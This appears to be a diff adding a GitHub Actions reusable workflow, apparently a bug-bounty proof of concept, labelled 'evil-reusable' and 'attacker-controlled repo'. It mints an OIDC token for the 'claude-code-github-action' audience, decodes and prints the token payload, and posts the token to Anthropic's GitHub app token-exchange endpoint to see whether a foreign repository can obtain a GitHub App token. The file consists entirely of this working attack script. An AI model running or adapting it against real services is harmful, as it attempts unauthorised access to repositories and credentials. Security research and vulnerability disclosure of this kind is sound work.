@@ -1,0 +1,34 @@
+name: evil-reusable
+
+on:
+  workflow_call:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exchange:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Mint OIDC + exchange (attacker-controlled repo)
+        run: |
+          AUD="claude-code-github-action"
+          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
+          TOK=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
+          echo "::add-mask::$TOK"
+          PAYLOAD=$(echo "$TOK" | cut -d. -f2)
+          PADLEN=$(( 4 - ${#PAYLOAD} % 4 ))
+          [ $PADLEN -lt 4 ] && PAYLOAD="${PAYLOAD}$(printf '=%.0s' $(seq 1 $PADLEN))"
+          echo "::group::OIDC payload (EXTERNAL-EVIL)"
+          echo "$PAYLOAD" | tr -- '-_' '+/' | base64 -d 2>/dev/null | jq .
+          echo "::endgroup::"
+          HTTP=$(curl -sk -o /tmp/exchange_response.json -w '%{http_code}' \
+            -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
+            -H "Authorization: Bearer $TOK" \
+            -H "Content-Type: application/json" \
+            -H "X-HackerOne-Handle: liamconner10" \
+            -d '{"permissions":{"contents":"read"}}')
+          echo "HTTP $HTTP"
+          jq 'if .token then .token = "<MASKED>" else . end' /tmp/exchange_response.json
+          echo "EVIL-MARKER: attacker reusable executed"
